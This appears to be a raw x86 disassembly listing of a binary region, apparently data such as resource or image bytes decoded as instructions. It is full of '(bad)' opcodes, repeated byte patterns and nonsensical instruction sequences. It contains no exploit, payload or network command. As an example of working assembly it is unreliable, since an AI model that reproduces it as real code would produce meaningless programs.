1100f5a3:	add    BYTE PTR [ecx+0x61],ah
1100f5a6:	popa   
1100f5a7:	add    BYTE PTR [ebp+0x65],ah
1100f5aa:	add    BYTE PTR gs:[edx+0x6a],ch
1100f5ae:	push   0x0
1100f5b0:	outs   dx,BYTE PTR ds:[esi]
1100f5b1:	outs   dx,BYTE PTR ds:[esi]
1100f5b2:	outs   dx,BYTE PTR ds:[esi]
1100f5b3:	add    BYTE PTR [edx+0x72],dh
1100f5b6:	jb     0x1100f5b8
1100f5b8:	js     0x1100f632
1100f5ba:	js     0x1100f5bc
1100f5bc:	jle    0x1100f63c
1100f5be:	jle    0x1100f5c0
1100f5c0:	xchg   DWORD PTR [edx+esi*1+0x0],ecx
1100f5c4:	mov    BYTE PTR [edx+esi*1+0x0],cl
1100f5c8:	leave  
1100f5c9:	push   ebx
1100f5ca:	cs add bl,cl
1100f5cd:	push   ebp
1100f5ce:	xor    BYTE PTR [eax],al
1100f5d0:	int    0x59
1100f5d2:	xor    eax,DWORD PTR [eax]
1100f5d4:	int3   
1100f5d5:	pop    ecx
1100f5d6:	xor    al,0x0
1100f5d8:	int3   
1100f5d9:	pop    esp
1100f5da:	cmp    al,BYTE PTR [eax]
1100f5dc:	rcr    BYTE PTR [esi+esi*1+0x0],1
1100f5e0:	shl    DWORD PTR [eax+0x38],cl
1100f5e3:	add    ah,dl
1100f5e5:	bound  edi,QWORD PTR [edx]
1100f5e7:	add    ch,dl
1100f5e9:	fs cmp al,0x0
1100f5ec:	fsub   DWORD PTR [edi+0x3e]
1100f5ef:	add    al,bl
1100f5f1:	push   0x64b1003f
1100f5f6:	inc    edx
1100f5f7:	add    ch,dl
1100f5f9:	addr16 inc edx
1100f5fb:	add    dl,bl
1100f5fd:	imul   eax,DWORD PTR [eax+0x0],0x436cdc
1100f604:	fsubr  DWORD PTR [ebx+0x44]
1100f607:	add    ch,bl
1100f609:	ins    DWORD PTR es:[edi],dx
1100f60a:	inc    esp
1100f60b:	add    dh,bl
1100f60d:	jo     0x1100f655
1100f60f:	add    cl,dl
1100f611:	jbe    0x1100f661
1100f613:	add    bh,dl
1100f615:	jb     0x1100f667
1100f617:	add    dh,bl
1100f619:	jnp    0x1100f672
1100f61b:	add    al,ah
1100f61d:	jno    0x1100f665
1100f61f:	add    cl,ah
1100f621:	jae    0x1100f66c
1100f623:	add    cl,ah
1100f625:	je     0x1100f671
1100f627:	add    bl,ah
1100f629:	jbe    0x1100f677
1100f62b:	add    ah,ah
1100f62d:	ja     0x1100f67c
1100f62f:	add    ah,ah
1100f631:	js     0x1100f680
1100f633:	add    al,ch
1100f635:	jl     0x1100f686
1100f637:	add    dh,ah
1100f639:	jnp    0x1100f68b
1100f63b:	add    dh,ah
1100f63d:	jl     0x1100f691
1100f63f:	add    al,ch
1100f641:	jge    0x1100f694
1100f643:	add    cl,ch
1100f645:	jg     0x1100f69b
1100f647:	add    ah,ah
1100f649:	adc    DWORD PTR [ebp+0x0],0x5380eb
1100f650:	call   0xfd014cd7
1100f655:	adc    BYTE PTR [ebp+0x0],0xe9
1100f659:	sbb    BYTE PTR [eax+0x0],0xed
1100f65d:	xchg   BYTE PTR [ecx+0x0],bl
1100f660:	in     al,dx
1100f661:	xchg   DWORD PTR [eax+eax*1-0x13],ebx
1100f665:	mov    BYTE PTR [ebp+0x0],bl
1100f668:	lock xchg DWORD PTR [ecx+0x0],ebx
1100f66c:	repnz mov BYTE PTR [ecx+0x0],bl
1100f670:	icebp  
1100f671:	mov    bl,BYTE PTR [eax+eax*1-0xe]
1100f675:	mov    WORD PTR [edi+0x0],ds
1100f678:	hlt    
1100f679:	mov    WORD PTR [esi+0x0],ds
1100f67c:	fisttp QWORD PTR [ebx-0x7422ff91]
1100f682:	jo     0x1100f684
1100f684:	fst    QWORD PTR [edx-0x7411ff86]
1100f68a:	pusha  
1100f68b:	add    bh,ch
1100f68d:	mov    WORD PTR [edx+0x0],fs
1100f690:	icebp  
1100f691:	lea    esp,[ecx+0x0]
1100f694:	hlt    
1100f695:	mov    fs,WORD PTR [ecx+0x0]
1100f698:	icebp  
1100f699:	(bad)  
1100f69a:	fs add ah,dh
1100f69d:	nop
1100f69e:	bound  eax,QWORD PTR [eax]
1100f6a0:	icebp  
1100f6a1:	xchg   ecx,eax
1100f6a2:	data16 add ah,dh
1100f6a5:	xchg   edx,eax
1100f6a6:	data16 add dl,dh
1100f6a9:	xchg   ebx,eax
1100f6aa:	push   0x6b96f300
1100f6af:	add    ah,dh
1100f6b1:	xchg   ebp,eax
1100f6b2:	push   0x0
1100f6b4:	hlt    
1100f6b5:	xchg   esi,eax
1100f6b6:	ins    BYTE PTR es:[edi],dx
1100f6b7:	add    ah,dh
1100f6b9:	cwde   
1100f6ba:	outs   dx,BYTE PTR ds:[esi]
1100f6bb:	add    dh,ah
1100f6bd:	xchg   edi,eax
1100f6be:	jns    0x1100f6c0
1100f6c0:	cmc    
1100f6c1:	call   0x75:0x9df50071
1100f6c8:	neg    BYTE PTR [edi-0x5f0aff88]
1100f6ce:	jns    0x1100f6d0
1100f6d0:	mul    BYTE PTR [edx-0x5909ff83]
1100f6d6:	add    DWORD PTR [eax],0x84a7f6
1100f6dc:	imul   DWORD PTR [eax-0x5408ff7c]
1100f6e2:	mov    BYTE PTR [eax],al
1100f6e4:	imul   DWORD PTR [ebp-0x550fff75]
1100f6ea:	mov    es,WORD PTR [eax]
1100f6ec:	imul   DWORD PTR [esi-0x4f08ff73]
1100f6f2:	pop    DWORD PTR [eax]
1100f6f4:	div    DWORD PTR [ecx-0x4a08ff70]
1100f6fa:	xchg   esi,eax
1100f6fb:	add    al,bh
1100f6fd:	mov    al,0x90
1100f6ff:	add    al,bh
1100f701:	mov    bl,0x94
1100f703:	add    al,bh
1100f705:	mov    ah,0x96
1100f707:	add    al,bh
1100f709:	mov    dh,0x99
1100f70b:	add    al,bh
1100f70d:	mov    ecx,0xb4e8009d
1100f712:	mov    ds:0xa6b5e800,eax
1100f717:	add    al,bh
1100f719:	mov    ebx,0xbdf800a0
1100f71e:	mov    ds:0xa4bef900,al
1100f723:	add    cl,dh
1100f725:	mov    edi,0xc0f900ac
1100f72a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
1100f72b:	add    cl,bh
1100f72d:	ret    0xaa
1100f730:	stc    
1100f731:	lds    ebp,FWORD PTR [ebp-0x463a1400]
1100f737:	add    cl,bh
1100f739:	(bad)  
1100f73a:	mov    al,0x0
1100f73c:	stc    
1100f73d:	leave  
1100f73e:	mov    ah,0x0
1100f740:	stc    
1100f741:	int3   
1100f742:	mov    bh,0x0
1100f744:	cli    
1100f745:	int    0xb9
1100f747:	add    dl,bh
1100f749:	iret   
1100f74a:	mov    esp,0xbdd0fa00
1100f74f:	add    dl,bl
1100f751:	fcmovu st,st(2)
1100f753:	add    ah,bl
1100f755:	(bad)  
1100f757:	add    ah,bl
1100f759:	(bad)  
1100f75b:	add    dl,bh
1100f75d:	aam    0xc3
1100f75f:	add    dl,bh
1100f761:	(bad)  
1100f762:	mov    BYTE PTR [eax],0xfb
1100f765:	fadd   st,st(7)
1100f767:	add    dl,bh
1100f769:	xlat   BYTE PTR ds:[ebx]
1100f76a:	enter  0xfb00,0xd9
1100f76e:	leave  
1100f76f:	add    bl,bh
1100f771:	fcmovne st,st(5)
1100f773:	add    bl,bh
1100f775:	(bad)  
1100f777:	add    ah,bh
1100f779:	(bad)  
1100f77b:	add    bl,bh
1100f77d:	fst    st(0)
1100f77f:	add    ah,bh
1100f781:	in     al,0xd9
1100f783:	add    ch,bh
1100f785:	jmp    0xfcf8f86a
1100f78a:	out    0x0,eax
1100f78c:	sti    
1100f78d:	out    dx,eax
1100f78e:	jmp    0xfcf1f393
1100f793:	add    ch,bh
1100f795:	repnz in al,dx
1100f797:	add    ch,bh
1100f799:	div    dl
1100f79b:	add    ch,bh
1100f79d:	std    
1100f79e:	std    
1100f79f:	add    BYTE PTR [eax],al
1100f7a1:	add    BYTE PTR [eax],al
1100f7a3:	add    BYTE PTR [edi],ch
1100f7a5:	add    eax,DWORD PTR [eax]
1100f7a7:	add    BYTE PTR [eax+0x4],dl
1100f7aa:	add    BYTE PTR [eax],al
1100f7ac:	jo     0x1100f7b4
1100f7ae:	add    BYTE PTR [eax],al
1100f7b0:	nop
1100f7b1:	or     DWORD PTR [eax],eax
1100f7b3:	add    BYTE PTR [eax-0x30fffff6],dh
1100f7b9:	or     al,0x0
1100f7bb:	add    al,dh
1100f7bd:	push   cs
1100f7be:	add    BYTE PTR [eax],al
1100f7c0:	jmp    DWORD PTR [eax]
1100f7c2:	adc    al,BYTE PTR [eax]
1100f7c4:	(bad)  
1100f7c5:	xor    DWORD PTR ds:[eax],eax
1100f7c8:	call   FWORD PTR [ecx+edx*2+0x0]
1100f7cc:	(bad)  
1100f7cd:	jp     0x1100f840
1100f7cf:	add    bh,bh
1100f7d1:	xchg   edi,eax
1100f7d2:	xchg   ecx,eax
1100f7d3:	add    bh,bh
1100f7d5:	mov    dh,0xb1
1100f7d7:	add    bh,bh
1100f7d9:	aam    0xd1
1100f7db:	add    bh,bh
1100f7dd:	(bad)  
1100f7de:	inc    DWORD PTR [eax]
1100f7e0:	add    BYTE PTR [eax],al
1100f7e2:	add    BYTE PTR [eax],al
1100f7e4:	das    
1100f7e5:	add    BYTE PTR [esi],cl
1100f7e7:	add    BYTE PTR [eax+0x0],dl
1100f7ea:	pop    ss
1100f7eb:	add    BYTE PTR [eax+0x0],dh
1100f7ee:	and    DWORD PTR [eax],eax
1100f7f0:	nop
1100f7f1:	add    BYTE PTR [ebx],ch
1100f7f3:	add    BYTE PTR [eax-0x30ffca00],dh
1100f7f9:	add    BYTE PTR [eax+0x0],al
1100f7fc:	lock add BYTE PTR [ecx+0x0],cl
1100f800:	call   DWORD PTR [ecx]
1100f802:	pop    edx
1100f803:	add    bh,bh
1100f805:	xor    DWORD PTR [eax+0x0],esi
1100f808:	call   DWORD PTR [ecx-0x7a]
1100f80b:	add    bh,bh
1100f80d:	jno    0x1100f7ab
1100f80f:	add    bh,bh
1100f811:	xchg   ecx,eax
1100f812:	mov    dl,0x0
1100f814:	push   DWORD PTR [ecx-0x2e00ff38]
1100f81a:	fild   WORD PTR [eax]
1100f81c:	(bad)  
1100f81d:	(bad)  
1100f81e:	inc    DWORD PTR [eax]
1100f820:	add    BYTE PTR [eax],al
1100f822:	add    BYTE PTR [eax],al
1100f824:	das    
1100f825:	add    BYTE PTR [eax],ah
1100f827:	add    BYTE PTR [eax+0x0],dl
1100f82a:	add    BYTE PTR ss:[eax+0x0],dh
1100f82e:	dec    esp
1100f82f:	add    BYTE PTR [eax-0x4fff9e00],dl
1100f835:	add    BYTE PTR [eax+0x0],bh
1100f838:	iret   
1100f839:	add    BYTE PTR [esi-0x5bff1000],cl
1100f83f:	add    bh,bh
1100f841:	adc    DWORD PTR [ebx-0x41ce0100],esi
1100f847:	add    bh,bh
1100f849:	push   ecx
1100f84a:	mov    DWORD PTR [eax],0xd171ff
1100f850:	call   DWORD PTR [ecx-0x4e00ff24]
1100f856:	in     eax,0x0
1100f858:	call   ecx
1100f85a:	lock add bh,bh
1100f85d:	(bad)  
1100f85e:	inc    DWORD PTR [eax]
1100f860:	add    BYTE PTR [eax],al
1100f862:	add    BYTE PTR [eax],al
1100f864:	sub    al,0x0
1100f866:	das    
1100f867:	add    BYTE PTR [ebx+0x0],cl
1100f86a:	push   eax
1100f86b:	add    BYTE PTR [ecx+0x0],ch
1100f86e:	jo     0x1100f870
1100f870:	xchg   DWORD PTR [eax],eax
1100f872:	nop
1100f873:	add    BYTE PTR [ebp-0x3bff5000],ah
1100f879:	add    bh,cl
1100f87b:	add    cl,ah
1100f87d:	add    al,dh
1100f87f:	add    al,dh
1100f881:	adc    edi,edi
1100f883:	add    dl,dh
1100f885:	xor    edi,edi
1100f887:	add    ah,dh
1100f889:	push   ecx
1100f88a:	inc    DWORD PTR [eax]
1100f88c:	div    BYTE PTR [ecx-0x1]
1100f88f:	add    bh,dh
1100f891:	xchg   ecx,eax
1100f892:	inc    DWORD PTR [eax]
1100f894:	stc    
1100f895:	mov    cl,0xff
1100f897:	add    bl,bh
1100f899:	sar    edi,1
1100f89b:	add    bh,bh
1100f89d:	(bad)  
1100f89e:	inc    DWORD PTR [eax]
1100f8a0:	add    BYTE PTR [eax],al
1100f8a2:	add    BYTE PTR [eax],al
1100f8a4:	sbb    eax,DWORD PTR [eax]
1100f8a6:	das    
1100f8a7:	add    BYTE PTR ds:0x3f005000,ch
1100f8ad:	add    BYTE PTR [eax+0x0],dh
1100f8b0:	push   edx
1100f8b1:	add    BYTE PTR [eax-0x4fff9d00],dl
1100f8b7:	add    BYTE PTR [esi+0x0],dh
1100f8ba:	iret   
1100f8bb:	add    BYTE PTR [eax-0x66ff1000],cl
1100f8c1:	adc    edi,edi
1100f8c3:	add    BYTE PTR [esi-0x4bff00cf],ah
1100f8c9:	push   ecx
1100f8ca:	inc    DWORD PTR [eax]
1100f8cc:	ret    0xff71
1100f8cf:	add    bh,cl
1100f8d1:	xchg   ecx,eax
1100f8d2:	inc    DWORD PTR [eax]
1100f8d4:	fdiv   QWORD PTR [ecx-0x2e14ff01]
1100f8da:	inc    DWORD PTR [eax]
1100f8dc:	(bad)  
1100f8dd:	(bad)  
1100f8de:	inc    DWORD PTR [eax]
1100f8e0:	add    BYTE PTR [eax],al
1100f8e2:	add    BYTE PTR [eax],al
1100f8e4:	or     BYTE PTR [eax],al
1100f8e6:	das    
1100f8e7:	add    BYTE PTR [esi],cl
1100f8e9:	add    BYTE PTR [eax+0x0],dl
1100f8ec:	adc    eax,0x1b007000
1100f8f1:	add    BYTE PTR [eax-0x4fffdf00],dl
1100f8f7:	add    BYTE PTR [esi],ah
1100f8f9:	add    bh,cl
1100f8fb:	add    BYTE PTR [eax+eax*1],ch
1100f8fe:	lock add BYTE PTR [esi],bh
1100f901:	adc    edi,edi
1100f903:	add    BYTE PTR [eax+0x31],bl
1100f906:	inc    DWORD PTR [eax]
1100f908:	jno    0x1100f95b
1100f90a:	inc    DWORD PTR [eax]
1100f90c:	mov    WORD PTR [ecx-0x1],?
1100f90f:	add    BYTE PTR [esi-0x40ff006f],ah
1100f915:	mov    cl,0xff
1100f917:	add    dl,bl
1100f919:	sar    edi,1
1100f91b:	add    bh,bh
1100f91d:	(bad)  
1100f91e:	inc    DWORD PTR [eax]
	...
1100f964:	add    BYTE PTR [eax],al
1100f966:	add    BYTE PTR [ebx],al
1100f968:	add    al,BYTE PTR [eax]
	...
1100f996:	add    cl,BYTE PTR [ecx]
1100f998:	or     DWORD PTR [edx],eax
	...
1100f9c2:	add    BYTE PTR [eax],al
1100f9c4:	add    BYTE PTR [edx],al
1100f9c6:	or     DWORD PTR [esi+0x2098c],ecx
	...
1100f9f4:	add    DWORD PTR [ecx],ecx
1100f9f6:	mov    WORD PTR [edi+0x2098c9f],ds
	...
1100fa20:	add    BYTE PTR [eax],al
1100fa22:	add    BYTE PTR [ecx],al
1100fa24:	or     DWORD PTR [ebp-0x60505051],ecx
1100fa2a:	mov    WORD PTR [ecx],cs
	...
1100fa50:	add    DWORD PTR [eax],eax
1100fa52:	add    BYTE PTR [ecx],cl
1100fa54:	mov    WORD PTR [edi-0x50506061],gs
1100fa5a:	lahf   
1100fa5b:	mov    WORD PTR [ecx],cs
	...
1100fa75:	add    BYTE PTR [eax],al
1100fa77:	or     eax,0x18191a1a
1100fa7c:	push   ss
1100fa7d:	adc    al,0xd
1100fa7f:	or     eax,DWORD PTR ds:0xaf8d0900
1100fa85:	scas   eax,DWORD PTR es:[edi]
1100fa86:	scas   eax,DWORD PTR es:[edi]
1100fa87:	scas   eax,DWORD PTR es:[edi]
1100fa88:	lahf   
1100fa89:	scas   eax,DWORD PTR es:[edi]
1100fa8a:	scas   eax,DWORD PTR es:[edi]
1100fa8b:	lahf   
1100fa8c:	mov    WORD PTR [ecx],cs
1100fa8e:	add    BYTE PTR ds:0x16140d0a,al
1100fa94:	pop    ss
1100fa95:	sbb    DWORD PTR [edx],ebx
1100fa97:	sbb    cl,BYTE PTR ds:0x0
	...
1100faa5:	add    BYTE PTR [eax],al
1100faa7:	sbb    dl,BYTE PTR [edx+edx*2+0x4a]
1100faab:	cmp    al,0x35
1100faad:	sub    DWORD PTR ds:0x8d09010c,edx
1100fab3:	scas   eax,DWORD PTR es:[edi]
1100fab4:	scas   eax,DWORD PTR es:[edi]
1100fab5:	scas   eax,DWORD PTR es:[edi]
1100fab6:	lahf   
1100fab7:	scas   eax,DWORD PTR es:[edi]
1100fab8:	scas   eax,DWORD PTR es:[edi]
1100fab9:	lahf   
1100faba:	scas   eax,DWORD PTR es:[edi]
1100fabb:	scas   eax,DWORD PTR es:[edi]
1100fabc:	lahf   
1100fabd:	mov    WORD PTR [ecx],cs
1100fabf:	add    DWORD PTR [edx*1+0x4a3c3529],ecx
1100fac6:	push   edx
1100fac7:	push   ebx
1100fac8:	sbb    al,BYTE PTR [ecx]
	...
1100fad6:	add    BYTE PTR [edx],bl
1100fad8:	push   edx
1100fad9:	dec    edx
1100fada:	cmp    al,0x35
1100fadc:	sub    BYTE PTR ds:0x8d09010c,dl
1100fae2:	scas   eax,DWORD PTR es:[edi]
1100fae3:	scas   eax,DWORD PTR es:[edi]
1100fae4:	scas   eax,DWORD PTR es:[edi]
1100fae5:	lahf   
1100fae6:	scas   eax,DWORD PTR es:[edi]
1100fae7:	scas   eax,DWORD PTR es:[edi]
1100fae8:	lahf   
1100fae9:	scas   eax,DWORD PTR es:[edi]
1100faea:	lahf   
1100faeb:	scas   eax,DWORD PTR es:[edi]
1100faec:	scas   eax,DWORD PTR es:[edi]
1100faed:	lahf   
1100faee:	mov    WORD PTR [ecx],cs
1100faf0:	add    DWORD PTR [edx*1+0x4a3c3529],ecx
1100faf7:	push   edx
1100faf8:	sbb    al,BYTE PTR [eax]
	...
1100fb06:	add    BYTE PTR [ecx],bl
1100fb08:	dec    edx
1100fb09:	cmp    al,0x35
1100fb0b:	sub    DWORD PTR ds:0x8c09010c,edx
1100fb11:	scas   eax,DWORD PTR es:[edi]
1100fb12:	scas   eax,DWORD PTR es:[edi]
1100fb13:	scas   eax,DWORD PTR es:[edi]
1100fb14:	lahf   
1100fb15:	scas   eax,DWORD PTR es:[edi]
1100fb16:	scas   eax,DWORD PTR es:[edi]
1100fb17:	lahf   
1100fb18:	scas   eax,DWORD PTR es:[edi]
1100fb19:	lahf   
1100fb1a:	scas   eax,DWORD PTR es:[edi]
1100fb1b:	scas   eax,DWORD PTR es:[edi]
1100fb1c:	lahf   
1100fb1d:	scas   eax,DWORD PTR es:[edi]
1100fb1e:	scas   eax,DWORD PTR es:[edi]
1100fb1f:	mov    WORD PTR [ecx],cs
1100fb21:	add    DWORD PTR [edx*1+0x4a3c3529],ecx
1100fb28:	sbb    al,BYTE PTR [eax]
	...
1100fb36:	add    BYTE PTR [eax],bl
1100fb38:	cmp    al,0x35
1100fb3a:	sub    BYTE PTR ds:0x8e09010c,dl
1100fb40:	scas   eax,DWORD PTR es:[edi]
1100fb41:	scas   eax,DWORD PTR es:[edi]
1100fb42:	lahf   
1100fb43:	scas   eax,DWORD PTR es:[edi]
1100fb44:	scas   eax,DWORD PTR es:[edi]
1100fb45:	lahf   
1100fb46:	scas   eax,DWORD PTR es:[edi]
1100fb47:	lahf   
1100fb48:	scas   eax,DWORD PTR es:[edi]
1100fb49:	lahf   
1100fb4a:	scas   eax,DWORD PTR es:[edi]
1100fb4b:	lahf   
1100fb4c:	scas   eax,DWORD PTR es:[edi]
1100fb4d:	scas   eax,DWORD PTR es:[edi]
1100fb4e:	lahf   
1100fb4f:	scas   eax,DWORD PTR es:[edi]
1100fb50:	mov    WORD PTR [ecx],cs
1100fb52:	add    DWORD PTR [edx*1+0x173c3529],ecx
	...
1100fb65:	add    BYTE PTR [eax],al
1100fb67:	push   ss
1100fb68:	xor    eax,0x20c1528
1100fb6d:	or     DWORD PTR [ebp-0x50606051],ecx
1100fb73:	fwait
1100fb74:	and    DWORD PTR [edi+0x3e],0x583d3639
1100fb7b:	jl     0x1100fb17
1100fb7d:	scas   eax,DWORD PTR es:[edi]
1100fb7e:	scas   eax,DWORD PTR es:[edi]
1100fb7f:	lahf   
1100fb80:	scas   eax,DWORD PTR es:[edi]
1100fb81:	mov    WORD PTR [ecx],cs
1100fb83:	add    DWORD PTR [edx*1+0x163528],ecx
	...
1100fb96:	add    BYTE PTR [ecx+ebp*1],dl
1100fb99:	adc    eax,0x8d09010c
1100fb9e:	scas   eax,DWORD PTR es:[edi]
1100fb9f:	scas   eax,DWORD PTR es:[edi]
1100fba0:	scas   eax,DWORD PTR es:[edi]
1100fba1:	pushf  
1100fba2:	jb     0x1100fbe8
1100fba4:	aas    
1100fba5:	cmp    bh,BYTE PTR [eax]
1100fba7:	xor    esi,DWORD PTR [edx]
1100fba9:	xor    BYTE PTR [edi],ch
1100fbab:	sub    al,0x2d
1100fbad:	pop    ecx
1100fbae:	call   0x109:0x8caf9faf
1100fbb5:	or     al,0x15
1100fbb7:	sub    DWORD PTR [eax+eax*1],edx
	...
1100fbc6:	add    BYTE PTR ds:0x9010c15,cl
1100fbcc:	lea    ebp,[edi+0x5190afaf]
1100fbd2:	inc    ebp
1100fbd3:	inc    esp
1100fbd4:	inc    edx
1100fbd5:	aas    
1100fbd6:	cmp    edi,DWORD PTR [eax]
1100fbd8:	xor    al,0x32
1100fbda:	xor    DWORD PTR [edi],ebp
1100fbdc:	sub    eax,0xaf852e2b
1100fbe1:	lahf   
1100fbe2:	scas   eax,DWORD PTR es:[edi]
1100fbe3:	mov    WORD PTR [ecx],cs
1100fbe5:	add    DWORD PTR [edx*1+0xd],ecx
	...
1100fbf4:	add    BYTE PTR [eax],al
1100fbf6:	add    BYTE PTR [ebx],cl
1100fbf8:	or     al,0x1
1100fbfa:	or     DWORD PTR [ebp-0x75505051],ecx
1100fc00:	push   ebx
1100fc01:	dec    ebp
1100fc02:	dec    ebx
1100fc03:	dec    eax
1100fc04:	inc    ebp
1100fc05:	inc    edx
1100fc06:	inc    eax
1100fc07:	cmp    edi,DWORD PTR [eax]
1100fc09:	xor    al,0x32
1100fc0b:	xor    BYTE PTR [edi],ch
1100fc0d:	sub    eax,0xaf7d2a2b
1100fc12:	lahf   
1100fc13:	scas   eax,DWORD PTR es:[edi]
1100fc14:	mov    WORD PTR [ecx],cs
1100fc16:	add    DWORD PTR [ebx+ecx*1],ecx
	...
1100fc25:	add    BYTE PTR [eax],al
1100fc27:	add    eax,0xaf8d0902
1100fc2c:	scas   eax,DWORD PTR es:[edi]
1100fc2d:	scas   eax,DWORD PTR es:[edi]
1100fc2e:	xchg   ebx,eax
1100fc2f:	push   esi
1100fc30:	push   esp
1100fc31:	push   ebx
1100fc32:	dec    edi
1100fc33:	dec    ebp
1100fc34:	dec    ecx
1100fc35:	inc    esi
1100fc36:	inc    ebx
1100fc37:	inc    eax
1100fc38:	cmp    edi,DWORD PTR [eax]
1100fc3a:	aaa    
1100fc3b:	xor    dh,BYTE PTR [ecx]
1100fc3d:	das    
1100fc3e:	sub    eax,0xaf852a2b
1100fc43:	scas   eax,DWORD PTR es:[edi]
1100fc44:	scas   eax,DWORD PTR es:[edi]
1100fc45:	mov    WORD PTR [ecx],cs
1100fc47:	add    DWORD PTR ds:0x0,eax
	...
1100fc55:	add    BYTE PTR [eax],al
1100fc57:	add    BYTE PTR [ecx],cl
1100fc59:	lea    ebp,[edi+0x619dafaf]
1100fc5f:	push   esi
1100fc60:	pop    ebp
1100fc61:	pop    ebp
1100fc62:	push   esp
1100fc63:	push   edx
1100fc64:	dec    edi
1100fc65:	dec    ecx
1100fc66:	dec    eax
1100fc67:	inc    esp
1100fc68:	inc    ecx
1100fc69:	cmp    edi,DWORD PTR [edx]
1100fc6b:	aaa    
1100fc6c:	xor    dh,BYTE PTR [ecx]
1100fc6e:	das    
1100fc6f:	das    
1100fc70:	sub    ebp,DWORD PTR [esi]
1100fc72:	call   0x9:0x8caf9faf
	...
1100fc85:	add    BYTE PTR [eax],al
1100fc87:	or     DWORD PTR [ebp-0x50605051],ecx
1100fc8d:	jp     0x1100fcec
1100fc8f:	pop    edi
1100fc90:	pop    edi
1100fc91:	pop    edi
1100fc92:	pop    edi
1100fc93:	push   ebp
1100fc94:	push   ecx
1100fc95:	dec    edi
1100fc96:	dec    esp
1100fc97:	inc    edi
1100fc98:	inc    esi
1100fc99:	inc    edx
1100fc9a:	cmp    edi,DWORD PTR [edx]
1100fc9c:	aaa    
1100fc9d:	xor    dh,BYTE PTR [edx]
1100fc9f:	das    
1100fca0:	sub    al,0x2b
1100fca2:	pop    ecx
1100fca3:	scas   eax,DWORD PTR es:[edi]
1100fca4:	scas   eax,DWORD PTR es:[edi]
1100fca5:	scas   eax,DWORD PTR es:[edi]
1100fca6:	scas   eax,DWORD PTR es:[edi]
1100fca7:	mov    WORD PTR [ecx],cs
	...
1100fcb5:	add    cl,BYTE PTR [ecx]
1100fcb7:	mov    WORD PTR [edi-0x62505051],gs
1100fcbd:	pop    edi
1100fcbe:	pop    edi
1100fcbf:	popa   
1100fcc0:	popa   
1100fcc1:	popa   
1100fcc2:	popa   
1100fcc3:	popa   
1100fcc4:	pop    edi
1100fcc5:	pop    edx
1100fcc6:	push   eax
1100fcc7:	dec    esp
1100fcc8:	inc    edi
1100fcc9:	inc    esi
1100fcca:	inc    ecx
1100fccb:	cmp    edi,DWORD PTR [edx]
1100fccd:	aaa    
1100fcce:	xor    esi,DWORD PTR [ecx]
1100fcd0:	das    
1100fcd1:	sub    al,0x2d
1100fcd3:	call   0x98c:0xafafafaf
	...
1100fce2:	add    BYTE PTR [eax],al
1100fce4:	add    cl,BYTE PTR [ecx]
1100fce6:	lea    ebp,[edi-0x50505051]
1100fcec:	mov    DWORD PTR [edi+0x61],ebx
1100fcef:	fs fs gs gs gs fs pusha 
1100fcf6:	pop    edx
1100fcf7:	push   ecx
1100fcf8:	dec    esi
1100fcf9:	inc    edi
1100fcfa:	inc    esi
1100fcfb:	inc    edx
1100fcfc:	cmp    edi,DWORD PTR [edx]
1100fcfe:	aaa    
1100fcff:	xor    dh,BYTE PTR [ecx]
1100fd01:	das    
1100fd02:	sub    al,0x7c
1100fd04:	scas   eax,DWORD PTR es:[edi]
1100fd05:	scas   eax,DWORD PTR es:[edi]
1100fd06:	scas   eax,DWORD PTR es:[edi]
1100fd07:	scas   eax,DWORD PTR es:[edi]
1100fd08:	lahf   
1100fd09:	mov    WORD PTR [ecx],cs
1100fd0b:	add    DWORD PTR [eax],eax
1100fd0d:	add    BYTE PTR [eax],al
1100fd0f:	add    BYTE PTR [eax],al
1100fd11:	add    BYTE PTR [eax],al
1100fd13:	add    cl,BYTE PTR [ecx]
1100fd15:	mov    gs,WORD PTR [edi-0x50505051]
1100fd1b:	scas   eax,DWORD PTR es:[edi]
1100fd1c:	js     0x1100fd7f
1100fd1e:	gs push 0x68686868
1100fd24:	push   0x515b6165
1100fd29:	dec    esi
1100fd2a:	inc    edi
1100fd2b:	inc    esi
1100fd2c:	inc    ecx
1100fd2d:	aas    
1100fd2e:	cmp    dh,BYTE PTR [edi]
1100fd30:	xor    dh,BYTE PTR [eax]
1100fd32:	das    
1100fd33:	pop    eax
1100fd34:	scas   eax,DWORD PTR es:[edi]
1100fd35:	lahf   
1100fd36:	scas   eax,DWORD PTR es:[edi]
1100fd37:	scas   eax,DWORD PTR es:[edi]
1100fd38:	scas   eax,DWORD PTR es:[edi]
1100fd39:	scas   eax,DWORD PTR es:[edi]
1100fd3a:	mov    WORD PTR [ecx],cs
1100fd3c:	add    al,BYTE PTR [eax]
1100fd3e:	add    BYTE PTR [eax],al
1100fd40:	add    BYTE PTR [eax],al
1100fd42:	add    ecx,DWORD PTR [ecx]
1100fd44:	mov    WORD PTR [edi-0x50505051],gs
1100fd4a:	scas   eax,DWORD PTR es:[edi]
1100fd4b:	scas   eax,DWORD PTR es:[edi]
1100fd4c:	ins    BYTE PTR es:[edi],dx
1100fd4d:	pushw  0x6b6a
1100fd51:	imul   ebp,DWORD PTR [ebx+0x6b],0x69
1100fd55:	push   0x515e6268
1100fd5a:	dec    esi
1100fd5b:	inc    edi
1100fd5c:	inc    esi
1100fd5d:	inc    ecx
1100fd5e:	aas    
1100fd5f:	cmp    BYTE PTR [edx+esi*1],dh
1100fd62:	xor    BYTE PTR ds:0xafafafaf,bh
1100fd68:	scas   eax,DWORD PTR es:[edi]
1100fd69:	scas   eax,DWORD PTR es:[edi]
1100fd6a:	lahf   
1100fd6b:	mov    WORD PTR [ecx],cs
1100fd6d:	add    eax,DWORD PTR [eax]
1100fd6f:	add    BYTE PTR [eax],al
1100fd71:	add    al,0x9
1100fd73:	mov    gs,WORD PTR [edi-0x50505051]
1100fd79:	scas   eax,DWORD PTR es:[edi]
1100fd7a:	scas   eax,DWORD PTR es:[edi]
1100fd7b:	scas   eax,DWORD PTR es:[edi]
1100fd7c:	push   0x6f6d6b68
1100fd81:	outs   dx,BYTE PTR ds:[esi]
1100fd82:	outs   dx,DWORD PTR ds:[esi]
1100fd83:	ins    DWORD PTR es:[edi],dx
1100fd84:	ins    BYTE PTR es:[edi],dx
1100fd85:	imul   ebp,DWORD PTR [ecx+0x68],0x62
1100fd89:	pop    esp
1100fd8a:	push   ecx
1100fd8b:	dec    esi
1100fd8c:	inc    edi
1100fd8d:	inc    esp
1100fd8e:	inc    ecx
1100fd8f:	cmp    edi,DWORD PTR [eax]
1100fd91:	xor    esi,DWORD PTR [edx]
1100fd93:	ss scas eax,DWORD PTR es:[edi]
1100fd95:	scas   eax,DWORD PTR es:[edi]
